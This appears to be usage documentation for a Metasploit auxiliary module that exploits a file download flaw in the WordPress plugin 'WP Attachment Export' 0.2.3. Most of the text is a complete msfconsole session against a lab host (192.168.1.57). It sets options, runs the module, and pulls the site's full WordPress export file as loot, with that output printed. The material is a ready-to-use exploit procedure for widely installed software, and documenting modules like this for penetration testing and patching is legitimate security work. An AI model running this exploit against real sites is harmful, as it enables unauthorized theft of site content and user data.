#### Add Wordpress Plugin Attachment Export File Download Vulnerability.

  Application: Wordpress Plugin 'WP Attachment Export' 0.2.3
  Homepage: https://wordpress.org/plugins/wp-attachment-export/
  Source Code: https://downloads.wordpress.org/plugin/wp-attachment-export.0.2.3.zip
  Active Installs (wordpress.org): 1,000+
  References: https://wpvulndb.com/vulnerabilities/8103

#### Vulnerable packages*
        
  0.2.3
  
#### Usage:

##### Linux (Ubuntu 12.04.5 LTS and 14.04.02 LTS):
```
msf > use auxiliary/scanner/http/wp_attachment_export_file_download 
msf auxiliary(wp_attachment_export_file_download) > show options 

Module options (auxiliary/scanner/http/wp_attachment_export_file_download):

   Name       Current Setting                Required  Description
   ----       ---------------                --------  -----------
   FILEPATH   wp-attachment-export-download  yes       The path to the file to read
   Proxies                                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.1.57                   yes       The target address range or CIDR identifier
   RPORT      80                             yes       The target port
   TARGETURI  /                              yes       The base path to the wordpress application
   THREADS    1                              yes       The number of concurrent threads
   VHOST                                     no        HTTP server virtual host

msf auxiliary(wp_attachment_export_file_download) > info 

       Name: WordPress Attachment Export File Download Vulnerability
     Module: auxiliary/scanner/http/wp_attachment_export_file_download
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Nitin Venkatesh
  Roberto Soares Espreto <robertoespreto@gmail.com>

Basic options:
  Name       Current Setting                Required  Description
  ----       ---------------                --------  -----------
  FILEPATH   wp-attachment-export-download  yes       The path to the file to read
  Proxies                                   no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS     192.168.1.57                   yes       The target address range or CIDR identifier
  RPORT      80                             yes       The target port
  TARGETURI  /                              yes       The base path to the wordpress application
  THREADS    1                              yes       The number of concurrent threads
  VHOST                                     no        HTTP server virtual host

Description:
  This module exploits a vulnerability in WordPress Plugin "WP 
  Attachment Export" version 0.2.3, allowing to download arbitrary 
  files with the web server privileges.

References:
  https://wpvulndb.com/vulnerabilities/8103
  https://packetstormsecurity.com/files/132693/

msf auxiliary(wp_attachment_export_file_download) > set RHOSTS 192.168.1.57
RHOSTS => 192.168.1.57
msf auxiliary(wp_attachment_export_file_download) > check
[*] 192.168.1.57:80 - The target service is running, but could not be validated.
[*] Checked 1 of 1 hosts (100% complete)
msf auxiliary(wp_attachment_export_file_download) > run

[*] Downloading file...
[+] 192.168.1.57:80 - File saved in: /home/espreto/.msf4/loot/20150729133240_default_192.168.1.57_attachmentexpor_076981.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(wp_attachment_export_file_download) > head -10 /home/espreto/.msf4/loot/20150729133240_default_192.168.1.57_attachmentexpor_076981.txt
[*] exec: head -10 /home/espreto/.msf4/loot/20150729133240_default_192.168.1.57_attachmentexpor_076981.txt

<?xml version="1.0" encoding="UTF-8" ?>
<!-- This is a WordPress eXtended RSS file generated by WordPress as an export of your site. -->
<!-- It contains information about your site's posts, pages, comments, categories, and other content. -->
<!-- You may use this file to transfer that content from one site to another. -->
<!-- This file is not intended to serve as a complete backup of your site. -->

<!-- To import this information into a WordPress site follow these steps: -->
<!-- 1. Log in to that site as an administrator. -->
<!-- 2. Go to Tools: Import in the WordPress admin panel. -->
<!-- 3. Install the "WordPress" importer from the list. -->
msf auxiliary(wp_attachment_export_file_download) > set VERBOSE true
VERBOSE => true
msf auxiliary(wp_attachment_export_file_download) > run

[*] Downloading file...

<?xml version="1.0" encoding="UTF-8" ?>
<!-- This is a WordPress eXtended RSS file generated by WordPress as an export of your site. -->
<!-- It contains information about your site's posts, pages, comments, categories, and other content. -->
<!-- You may use this file to transfer that content from one site to another. -->
<!-- This file is not intended to serve as a complete backup of your site. -->

<!-- To import this information into a WordPress site follow these steps: -->
<!-- 1. Log in to that site as an administrator. -->
<!-- 2. Go to Tools: Import in the WordPress admin panel. -->
<!-- 3. Install the "WordPress" importer from the list. -->
<!-- 4. Activate & Run Importer. -->
<!-- 5. Upload this file using the form provided on that page. -->
<!-- 6. You will first be asked to map the authors in this export file to users -->
<!--    on the site. For each author, you may choose to map to an -->
<!--    existing user on the site or to create a new user. -->
<!-- 7. WordPress will then import each of the posts, pages, comments, categories, etc. -->
<!--    contained in this file into your site. -->

<!-- generator="WordPress/4.2.3" created="2015-07-29 16:45" -->
<rss version="2.0"
	xmlns:excerpt="http://wordpress.org/export/1.2/excerpt/"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:wp="http://wordpress.org/export/1.2/"
>

<channel>
	<title>Wordpress Bug Hunter</title>
	<link>http://localhost</link>
	<description>Just another WordPress site</description>
	<pubDate>Wed, 29 Jul 2015 16:45:07 +0000</pubDate>
	<language>en-US</language>
	<wp:wxr_version>1.2</wp:wxr_version>
	<wp:base_site_url>http://localhost</wp:base_site_url>
	<wp:base_blog_url>http://localhost</wp:base_blog_url>

...snip...

</channel>
</rss>

[+] 192.168.1.57:80 - File saved in: /home/espreto/.msf4/loot/20150729133302_default_192.168.1.57_attachmentexpor_535689.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(wp_attachment_export_file_download) > 
```